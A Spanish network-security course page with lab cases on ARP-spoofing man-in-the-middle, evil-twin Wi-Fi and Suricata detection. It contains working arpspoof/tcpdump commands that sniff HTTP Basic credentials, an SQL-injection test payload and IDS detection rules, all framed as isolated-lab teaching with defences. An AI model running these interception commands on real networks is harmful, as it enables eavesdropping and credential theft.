---
title: "UD05 · Casos de ataque y defensa"
weight: 3
bookToc: true
---

# UD05 · Casos de ataque y defensa

{{< ra "RA2:c,d,g,i" "RA3:c" >}}

En una red local, los protocolos básicos (ARP, DHCP, DNS) **confían** en lo que reciben sin comprobar quién lo envía. Un atacante dentro de la red, o con una Wi-Fi falsa, puede aprovecharlo para colocarse **en medio** de las comunicaciones. En esta página reproduces el ataque de intermediario más clásico, lo detectas y compruebas qué medidas lo neutralizan.

| Caso | Ataque | Caso real | Tipo |
|---|---|---|---|
| [5.A](#caso-5a--intermediario-por-envenenamiento-arp) | *Man-in-the-middle* por envenenamiento ARP (*ARP spoofing*) | Ataque base de muchas intrusiones en LAN | Laboratorio |
| [5.B](#caso-5b--wi-fi-gemela-maliciosa-evil-twin) | Wi-Fi gemela maliciosa (*evil twin*) | Aeropuertos y vuelos en Australia (2024) | Análisis + laboratorio opcional |
| [5.C](#caso-5c--detectar-el-reconocimiento-con-suricata) | Reconocimiento y escaneo de la red | Fase previa de casi todos los ataques | Laboratorio |
| [Búsqueda](#búsqueda-de-vulnerabilidades-en-equipos-y-protocolos-de-red) | Vulnerabilidades de Wi-Fi, *routers* y reglas IDS | — | Autónoma |

> [!IMPORTANT]
> Los ataques de esta página se hacen **solo en la red interna `sad-lan`** de VirtualBox, nunca en la red del centro ni en una Wi-Fi real que no sea tuya. Interceptar comunicaciones ajenas es delito (art. 197 bis del Código Penal). Recuerda las [normas de laboratorio](/ud01/ud01-casos/#antes-de-empezar-ética-y-legalidad-del-laboratorio). Estos casos **no se entregan**.

### Laboratorio común

Partimos del laboratorio de la unidad y añadimos un cliente y una máquina atacante en la LAN:

| Máquina | Función | IP (red `sad-lan`) |
|---|---|---|
| `gw-vpn` | *Router* de la LAN | 10.10.10.1 |
| `srv-lan` | Servidor web interno (Apache) | 10.10.10.10 |
| `cli-lan` | Cliente (la «víctima»), Debian 13 | 10.10.10.20 |
| `atacante` | Debian 13 o Kali Linux, **sin salida a Internet** durante el ataque | 10.10.10.66 |

En las órdenes, sustituye `enp0s3` por el nombre real de la interfaz de cada máquina (`ip -br a`). Haz una **instantánea** de `cli-lan`, `srv-lan` y `atacante` antes de empezar.

---

## Caso 5.A · Intermediario por envenenamiento ARP

{{< practica etiqueta="Caso" num="5.A" tipo="Guiada" duracion="2 h · trabajo autónomo" nivel="2" ra="RA2:c,d;RA3:c" entorno="Debian 13 · dsniff · arpwatch · tcpdump" entrega="captura del ataque, detección y comprobación de las medidas" >}}

### Qué es

**ARP** (*Address Resolution Protocol*) traduce direcciones IP a direcciones MAC dentro de una red local. Cuando `cli-lan` quiere hablar con `10.10.10.10`, pregunta «¿quién tiene 10.10.10.10?» y **cree** la primera respuesta que recibe; incluso acepta respuestas que no ha pedido. En el **envenenamiento ARP** el atacante envía respuestas falsas continuamente:

- a `cli-lan` le dice: «10.10.10.10 soy yo» (su MAC);
- a `srv-lan` le dice: «10.10.10.20 soy yo».

A partir de ese momento todo el tráfico entre los dos pasa por el atacante, que lo reenvía para que nadie note nada.

```mermaid
flowchart LR
  C[cli-lan<br/>10.10.10.20] -- "1. tráfico para .10" --> A[atacante<br/>10.10.10.66]
  A -- "2. lo lee y lo reenvía" --> S[srv-lan<br/>10.10.10.10]
  S -- "3. respuesta para .20" --> A
  A -- "4. reenvía" --> C
```

{{< figura src="ud05/arp-spoofing.svg" alt="Envenenamiento ARP" caption="Antes y durante el ataque: el tráfico pasa por el atacante sin que nadie lo note." >}}

### Ciclo del caso

| Fase | Descripción |
|---|---|
| **Vulnerabilidad** | ARP no tiene autenticación; la web interna usa HTTP con usuario y contraseña en claro |
| **Ataque** | `arpspoof` envenena las tablas ARP de cliente y servidor; `tcpdump` captura las credenciales |
| **Detección** | Dos IP con la misma MAC en `ip neigh`; `arpwatch` avisa de cambios de MAC (*flip flop*) |
| **Mitigación** | Cifrar (HTTPS/SSH); entradas ARP estáticas en equipos críticos; *Dynamic ARP Inspection* (DAI) + *DHCP snooping* en los conmutadores; segmentar con VLAN |
| **Comprobación** | Repetir el ataque: la tabla ARP no cambia o el tráfico capturado es ilegible |

### 1. Servicio vulnerable (en `srv-lan`)

Una zona de la intranet protegida con **autenticación básica HTTP**, que envía usuario y contraseña simplemente codificados en Base64 (no cifrados):

```bash
sudo apt install -y apache2 apache2-utils
sudo mkdir -p /var/www/html/privado && echo "<h1>Historias clínicas</h1>" | sudo tee /var/www/html/privado/index.html
sudo htpasswd -c -b /etc/apache2/.htpasswd recepcion ClaveRecepcion1
sudo tee /etc/apache2/conf-available/privado.conf >/dev/null <<'EOF'
<Directory /var/www/html/privado>
    AuthType Basic
    AuthName "Zona privada"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
EOF
sudo a2enconf privado && sudo apache2ctl configtest && sudo systemctl reload apache2
```

En `cli-lan` comprueba que funciona y anota la MAC real del servidor:

```bash
curl -s -u recepcion:ClaveRecepcion1 http://10.10.10.10/privado/
ip neigh show 10.10.10.10          # anota la MAC (lladdr) de srv-lan
```

### 2. Detección preparada: `arpwatch` (en `cli-lan`)

`arpwatch` vigila las parejas IP-MAC de la red y avisa cuando una IP **cambia de MAC**.

```bash
sudo apt install -y arpwatch
sudo arpwatch -i enp0s3 -d          # -d: modo depuración, muestra los avisos en pantalla en lugar de enviar correo
```

Déjalo funcionando en una terminal.

### 3. El ataque (en `atacante`)

```bash
sudo apt install -y dsniff tcpdump       # dsniff incluye arpspoof; instálalo ANTES de aislar la máquina
sudo sysctl -w net.ipv4.ip_forward=1     # reenvía el tráfico para que la víctima no note el corte

# Dos terminales: envenenar al cliente y al servidor
sudo arpspoof -i enp0s3 -t 10.10.10.20 10.10.10.10     # terminal 1: «a .20 le digo que yo soy .10»
sudo arpspoof -i enp0s3 -t 10.10.10.10 10.10.10.20     # terminal 2: «a .10 le digo que yo soy .20»

# Terminal 3: capturar el tráfico HTTP que ahora pasa por el atacante
sudo tcpdump -i enp0s3 -A -n 'tcp port 80 and host 10.10.10.20' | grep -i --line-buffered 'Authorization'
```

Mientras tanto, en `cli-lan`, la víctima usa la intranet con normalidad:

```bash
curl -s -u recepcion:ClaveRecepcion1 http://10.10.10.10/privado/
```

{{% details title="🎯 Resultado esperado" open=false %}}
- En el atacante aparece `Authorization: Basic cmVjZXBjaW9uOkNsYXZlUmVjZXBjaW9uMQ==`. Decodifícalo con `echo 'cmVj…' | base64 -d` y obtendrás `recepcion:ClaveRecepcion1`.
- La víctima **no nota nada**: la página carga igual.
- Si olvidas activar `ip_forward`, la víctima pierde la conexión: el ataque se convierte en una **denegación de servicio** y es más fácil de notar.
{{% /details %}}

### 4. Detección (en `cli-lan`)

```bash
ip neigh show                                   # .10 tiene ahora la MAC del atacante (igual que .66)
ip neigh show | awk '{print $5}' | sort | uniq -d   # MAC repetidas en varias IP
```

Y en la terminal de `arpwatch` aparecen avisos `changed ethernet address` o `flip flop` para 10.10.10.10, con la MAC antigua y la nueva.

### 5. Mitigación

**a) Cifrar la comunicación (la medida más importante).** Aunque el atacante esté en medio, si el tráfico va por HTTPS y el cliente **valida el certificado**, solo verá datos cifrados (y si intenta suplantar el certificado, el cliente lo detecta, como en el [caso 3.A](/ud03/ud03-casos/#caso-3a--intermediario-con-un-certificado-falso)). Activa HTTPS en `srv-lan` con un certificado de tu CA (práctica 3.6) y redirige HTTP a HTTPS.

**b) Entrada ARP estática para un equipo crítico** (en `cli-lan`), con la MAC real que anotaste:

```bash
sudo ip neigh replace 10.10.10.10 lladdr 08:00:27:AA:BB:CC nud permanent dev enp0s3
ip neigh show 10.10.10.10                       # debe indicar PERMANENT
```

`nud permanent` hace que el sistema **ignore** las respuestas ARP para esa IP. Se pierde al reiniciar; para hacerla persistente se añade a la configuración de red o a un servicio de arranque. No escala a toda una red: se reserva para la puerta de enlace o un servidor crítico.

**c) En la red real: conmutadores gestionables.** La medida profesional es activar **DHCP snooping** (el conmutador aprende qué IP tiene cada puerto) y **Dynamic ARP Inspection** (descarta respuestas ARP que no coinciden con esa tabla). Revisa la [teoría](/ud05/ud05-teoria/) de protección de la LAN.

### 6. Comprobación

1. Repite el ataque con la entrada estática: `ip neigh show 10.10.10.10` sigue mostrando la MAC real y `tcpdump` en el atacante ya no ve el tráfico.
2. Quita la entrada estática (`sudo ip neigh del 10.10.10.10 dev enp0s3`), repite el ataque con la web en HTTPS (`curl --cacert ca.crt -u … https://srv-lan.clinica.lab/privado/`) y comprueba que en la captura no hay ninguna cabecera `Authorization` legible.
3. Al terminar: `Ctrl+C` en `arpspoof` (restaura las tablas ARP), `sudo sysctl -w net.ipv4.ip_forward=0` en el atacante.

### Variantes: Linux, Windows 11 y web

{{< tabs >}}
{{% tab "Linux" %}}
`ip neigh`, `arpwatch`, `ip neigh replace … nud permanent`.
{{% /tab %}}
{{% tab "Windows 11" %}}
Abre **PowerShell** (`Win` + `X` → *Terminal*; para lo que pida administrador, *Terminal (administrador)*).

```powershell
arp -a                                                  # tabla ARP de todas las interfaces
Get-NetNeighbor -IPAddress 10.10.10.10                  # la entrada del servidor, con su estado
Get-NetNeighbor | Group-Object LinkLayerAddress | Where-Object Count -gt 1   # MAC repetidas: sospechoso (el router puede repetirse legítimamente)

# Entrada estática para el servidor crítico (administrador). Sustituye la MAC real
New-NetNeighbor -IPAddress 10.10.10.10 -LinkLayerAddress 08-00-27-AA-BB-CC -InterfaceAlias "Ethernet" -State Permanent
Get-NetNeighbor -IPAddress 10.10.10.10                  # Estado: Permanent
# Para quitarla:
Remove-NetNeighbor -IPAddress 10.10.10.10 -Confirm:$false
```

Con **Wireshark** (con Npcap) captura en la interfaz de la LAN y usa el filtro `arp.duplicate-address-detected` o `arp.opcode == 2`: verás respuestas ARP repetidas que nadie ha pedido.
{{% /tab %}}
{{% tab "Web" %}}
Practica el análisis **sin montar el ataque**: en la wiki de Wireshark hay [capturas de ejemplo](https://wiki.wireshark.org/SampleCaptures) (busca las de *ARP*). Ábrelas con Wireshark y localiza:

1. Las respuestas ARP que se repiten sin petición previa.
2. Dos direcciones IP con la misma MAC.
3. Un `Authorization: Basic …` en HTTP: decodifícalo con `[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("..."))` en PowerShell.
{{% /tab %}}
{{< /tabs >}}

---

## Caso 5.B · Wi-Fi gemela maliciosa (*evil twin*)

{{< practica etiqueta="Caso" num="5.B" tipo="Autónoma" duracion="1 h · trabajo autónomo" nivel="2" ra="RA2:g;RA3:c" entorno="Navegador · (opcional) hostapd con adaptador USB Wi-Fi" entrega="análisis del caso y recomendaciones" >}}

### El caso real

En **2024** la Policía Federal australiana detuvo a un hombre que, con un dispositivo portátil, creaba **redes Wi-Fi con el mismo nombre** que las oficiales en aeropuertos de Perth, Melbourne y Adelaida y **durante vuelos nacionales**. Quien se conectaba veía una página que pedía iniciar sesión con su correo o sus redes sociales: las credenciales iban al atacante, que las usó para acceder a cuentas de las víctimas. En 2025 fue condenado a más de **7 años de prisión**.

A esta técnica se la llama **gemela maliciosa** (*evil twin*): un punto de acceso falso con el mismo nombre (SSID) que uno legítimo. Los dispositivos se conectan solos a redes «conocidas», sobre todo si son **abiertas**.

### Ciclo del caso

| Fase | Descripción |
|---|---|
| **Vulnerabilidad** | Redes abiertas o con contraseña compartida; dispositivos que se conectan solos a SSID conocidos; usuarios que introducen credenciales en portales cautivos |
| **Ataque** | Punto de acceso falso + portal cautivo falso → robo de credenciales y posición de intermediario |
| **Detección** | Sistemas WIDS que detectan varios puntos de acceso con el mismo SSID y distinto BSSID (MAC) o en canales inesperados |
| **Mitigación** | WPA3; en empresas, **WPA2/WPA3-Enterprise (802.1X)** con **validación del certificado del servidor RADIUS**; VPN en redes públicas; MFA; olvidar redes abiertas y desactivar la conexión automática |
| **Comprobación** | Un cliente bien configurado se niega a conectar a un punto de acceso cuyo certificado no es el de la empresa |

### Actividad

1. Explica por qué en una red **WPA2-Personal** cualquiera que conozca la contraseña puede montar una gemela maliciosa y en **WPA2-Enterprise con EAP-TLS** no (pista: ¿quién se autentica ante quién?).
2. ¿Por qué el portal cautivo del atacante funcionaba aunque las webs reales usaran HTTPS?
3. Redacta **cinco recomendaciones** para el personal de Mediterránea Dental que viaja o teletrabaja. Compáralas con los consejos de INCIBE sobre redes Wi-Fi públicas en su sección para la ciudadanía.
4. En la práctica 6.11 configurarás FreeRADIUS: anota qué parte de esa práctica evita este ataque.

{{% details title="💡 Laboratorio opcional (solo con un adaptador USB Wi-Fi propio)" open=false %}}
Si dispones de un adaptador Wi-Fi USB compatible con modo AP, puedes crear **en casa o en el aula, con tus propios dispositivos** una red abierta con `hostapd` y comprobar desde tu móvil:

- que el móvil la muestra igual que una red legítima con el mismo nombre;
- que, si la «olvidas» y desactivas la conexión automática, ya no se conecta sola.

No pongas nunca el nombre de una red real ajena (la del centro, un aeropuerto, una cafetería) ni dejes la red activa sin vigilancia.
{{% /details %}}

### Variantes: Linux, Windows 11 y web

{{< tabs >}}
{{% tab "Linux" %}}
`nmcli`, `iw dev`, y desactivar la conexión automática con `nmcli connection modify NOMBRE connection.autoconnect no`.
{{% /tab %}}
{{% tab "Windows 11" %}}
Abre **PowerShell** (`Win` + `X` → *Terminal*; para lo que pida administrador, *Terminal (administrador)*).

```powershell
netsh wlan show profiles                                           # redes Wi-Fi guardadas
netsh wlan show profile name="NOMBRE_RED" key=clear | findstr /i "Autenticación Cifrado"   # (administrador) tipo de seguridad
netsh wlan set profileparameter name="NOMBRE_RED" connectionmode=manual   # no conectar automáticamente
netsh wlan delete profile name="NOMBRE_RED"                         # olvidar una red abierta
```

Desde la interfaz: *Configuración → Red e Internet → Wi-Fi → Administrar redes conocidas*. Revisa las redes **abiertas** o con nombres genéricos que ya no uses y bórralas. En el panel de cada red, desactiva *Conectarse automáticamente dentro del alcance*.
{{% /tab %}}
{{% tab "Web" %}}
Consejos oficiales y ejemplos para usuarios: la sección de **Wi-Fi públicas** de [INCIBE para la ciudadanía](https://www.incibe.es/ciudadania) y las [recomendaciones de la Policía Federal Australiana](https://www.afp.gov.au/) sobre este caso. Compara con la tabla del caso: ¿qué recomendación del 017 evita cada fase del ataque?
{{% /tab %}}
{{< /tabs >}}

---

## Caso 5.C · Detectar el reconocimiento con Suricata

{{< practica etiqueta="Caso" num="5.C" tipo="Guiada" duracion="1 h · trabajo autónomo" nivel="2" ra="RA2:c,i" entorno="Debian 13 · Suricata 7 · Nmap" entrega="regla propia y alertas generadas" >}}

Casi todos los ataques empiezan por un **reconocimiento**: el atacante descubre qué equipos hay y qué servicios ofrecen. Detectarlo pronto da tiempo para reaccionar. Este caso amplía la [práctica 5.3](/ud05/ud05-practicas/) con reglas propias para dos señales típicas: un escaneo de puertos y el acceso a rutas de administración.

### 1. Reglas propias (en el sensor Suricata, `sad-web`)

Añade a `/etc/suricata/rules/local.rules` (y asegúrate de que el fichero aparece en `rule-files` de `/etc/suricata/suricata.yaml`):

```text
# Muchos SYN desde la misma IP en poco tiempo: posible escaneo de puertos
alert tcp any any -> $HOME_NET any (msg:"LOCAL Posible escaneo de puertos (SYN)"; flags:S,12; threshold:type both, track by_src, count 20, seconds 10; classtype:attempted-recon; sid:1000101; rev:1;)

# Acceso a rutas de administración típicas
alert http any any -> $HOME_NET any (msg:"LOCAL Acceso a ruta de administración"; http.uri; pcre:"/\/(phpmyadmin|wp-admin|admin|manager\/html)/i"; classtype:web-application-attack; sid:1000102; rev:1;)

# Carga típica de inyección SQL en la URL (enlaza con el caso 4.A)
alert http any any -> $HOME_NET any (msg:"LOCAL Posible inyección SQL (UNION SELECT)"; http.uri; content:"union"; nocase; content:"select"; nocase; distance:0; classtype:web-application-attack; sid:1000103; rev:1;)
```

- `flags:S,12`: paquetes con el indicador SYN activo (inicio de conexión TCP), ignorando los bits reservados.
- `threshold: … count 20, seconds 10`: alerta si una misma IP origen envía 20 en 10 segundos, y como máximo una vez por periodo.
- `http.uri` + `content`/`pcre`: busca el texto en la URL ya **decodificada** por Suricata (por eso detecta `UNION` aunque llegue como `%55NION` o `+UNION+`).
- `sid`: identificador único; los valores ≥ 1 000 000 están reservados para reglas locales.

```bash
sudo cp /etc/suricata/rules/local.rules /etc/suricata/rules/local.rules.bak 2>/dev/null
sudo suricata -T -c /etc/suricata/suricata.yaml -v 2>&1 | tail -n 3      # comprueba la configuración
sudo systemctl restart suricata
```

### 2. Generar los eventos (desde `sad-cli`)

```bash
sudo nmap -sS -p 1-1000 192.168.100.30
curl -s -o /dev/null http://192.168.100.30/phpmyadmin/
curl -sG -o /dev/null http://192.168.100.30/buscar.php --data-urlencode "nombre=' UNION SELECT 1,2 -- -"
```

### 3. Ver las alertas

```bash
sudo tail -n 20 /var/log/suricata/fast.log
sudo jq -c 'select(.event_type=="alert") | {ts:.timestamp, src:.src_ip, sig:.alert.signature}' /var/log/suricata/eve.json | tail -n 5
```

{{% details title="🎯 Resultado esperado" open=false %}}
Aparecen alertas con `sid` 1000101 (escaneo), 1000102 (ruta de administración) y 1000103 (inyección SQL), todas con origen 192.168.100.10. Si no aparece ninguna, comprueba que Suricata escucha en la interfaz correcta (`af-packet` en `suricata.yaml`), que `local.rules` está cargado (`grep local.rules /etc/suricata/suricata.yaml`) y que `HOME_NET` incluye 192.168.100.0/24.
{{% /details %}}

### Preguntas de análisis

1. ¿Estas alertas son **prevención** o **detección**? ¿Qué haría falta para bloquear el tráfico (IPS)?
2. Ajusta el umbral del escaneo: ¿qué pasa si un usuario legítimo abre una web con muchos recursos? ¿Sería un falso positivo?
3. Un escaneo lento (`nmap -T1`) ¿dispararía la regla 1000101? ¿Qué te dice eso sobre los límites de la detección por umbrales?

### Variantes: Linux, Windows 11 y web

{{< tabs >}}
{{% tab "Linux" %}}
Reglas propias en `local.rules`, `/var/log/suricata/fast.log`.
{{% /tab %}}
{{% tab "Windows 11" %}}
Abre **PowerShell** (`Win` + `X` → *Terminal*; para lo que pida administrador, *Terminal (administrador)*).

Windows Defender Firewall también **registra** lo que descarta, y permite ver un escaneo desde la víctima:

```powershell
# Activar el registro de paquetes bloqueados (administrador)
Set-NetFirewallProfile -Profile Domain,Private,Public -LogBlocked True -LogFileName "%SystemRoot%\System32\LogFiles\Firewall\pfirewall.log"
# Después de un escaneo desde la VM atacante (nmap -sS ...), mira el registro
Get-Content "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log" -Tail 20
# Cuántos intentos por IP origen (columna 5 = IP origen)
Get-Content "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log" | Select-Object -Skip 5 |
  ForEach-Object { ($_ -split ' ')[4] } | Group-Object | Sort-Object Count -Descending | Select-Object -First 5
```

Una misma IP origen con decenas de puertos distintos bloqueados en pocos segundos es el patrón de un escaneo.
{{% /tab %}}
{{% tab "Web" %}}
Las reglas del conjunto *Emerging Threats Open* tienen un buscador público: [rules.emergingthreats.net](https://rules.emergingthreats.net/). Busca *nmap* o *SQL injection*, lee el texto de una regla (`msg`, `content`, `flow`) y compárala con las tuyas del caso.
{{% /tab %}}
{{< /tabs >}}

---

## Búsqueda de vulnerabilidades en equipos y protocolos de red

{{< practica etiqueta="Búsqueda" num="5.D" tipo="Autónoma" duracion="1 h · trabajo autónomo" nivel="1" ra="RA2:b,g,i" entorno="Navegador · Debian 13" entrega="ficha comparativa" >}}

1. **Wi-Fi**: busca en NVD o INCIBE-CERT las familias de vulnerabilidades **KRACK** (2017, CVE-2017-13077 y siguientes) y **FragAttacks** (2021, CVE-2020-24586 y siguientes). Para cada una: ¿afecta al protocolo o a las implementaciones?, ¿qué se arregla actualizando y qué no?, ¿protege WPA3?
2. **Equipos de red domésticos y de pyme**: en los [avisos de INCIBE-CERT](https://www.incibe.es/incibe-cert/alerta-temprana/avisos) busca vulnerabilidades recientes en *routers* o puntos de acceso (TP-Link, Zyxel, D-Link, Ubiquiti, MikroTik…). Indica si el fabricante sigue dando soporte al modelo o si está en fin de vida.
3. **KEV**: en el [catálogo KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) filtra por uno de esos fabricantes. ¿Cuántas vulnerabilidades de *routers* se explotan activamente? ¿Para qué las usan los atacantes (*botnets* de DDoS, proxies residenciales)?
4. **Reglas IDS**: las reglas de Suricata llevan referencias a CVE. Busca cuántas reglas del conjunto instalado mencionan una vulnerabilidad concreta:

```bash
sudo suricata-update                                   # descarga el conjunto ET Open
grep -c "CVE_2023_34362\|cve,2023-34362" /var/lib/suricata/rules/suricata.rules
grep -o 'msg:"[^"]*MOVEit[^"]*"' /var/lib/suricata/rules/suricata.rules | head -n 5
```

¿Detectaría tu IDS un intento de explotar MOVEit ([caso 4.A](/ud04/ud04-casos/#caso-4a--inyección-sql))? ¿Y si el tráfico va por HTTPS? (Pista: el IDS no ve dentro del tráfico cifrado salvo que lo descifre un *proxy* inverso; lo verás en la UD06).

---

## Qué debes saber explicar

- Por qué ARP es vulnerable y cómo funciona un ataque de intermediario por envenenamiento ARP.
- Cómo se detecta (`ip neigh`, `arpwatch`) y qué medidas lo neutralizan (cifrado, ARP estático, DAI + DHCP snooping, VLAN).
- Qué es una Wi-Fi gemela maliciosa y por qué 802.1X con validación del certificado la evita.
- Cómo escribir y probar una regla sencilla de Suricata, y sus límites (umbrales, tráfico cifrado).

## Referencias

- IETF. [RFC 826: An Ethernet Address Resolution Protocol](https://www.rfc-editor.org/rfc/rfc826).
- Suricata. [Documentación: reglas](https://docs.suricata.io/en/latest/rules/index.html).
- Security Affairs (2025). [Australian man jailed for 7+ years over airport and in-flight Wi-Fi attacks](https://securityaffairs.com/185205/cyber-crime/australian-man-jailed-for-7-years-over-airport-and-in-flight-wi-fi-attacks.html).
- BleepingComputer (2024). [Australian charged for "Evil Twin" WiFi attack on plane](https://www.bleepingcomputer.com/news/security/australian-charged-for-evil-twin-wifi-attack-on-plane).
- Vanhoef, M. [KRACK Attacks](https://www.krackattacks.com/) y [FragAttacks](https://www.fragattacks.com/).
- INCIBE-CERT. [Avisos de seguridad](https://www.incibe.es/incibe-cert/alerta-temprana/avisos).
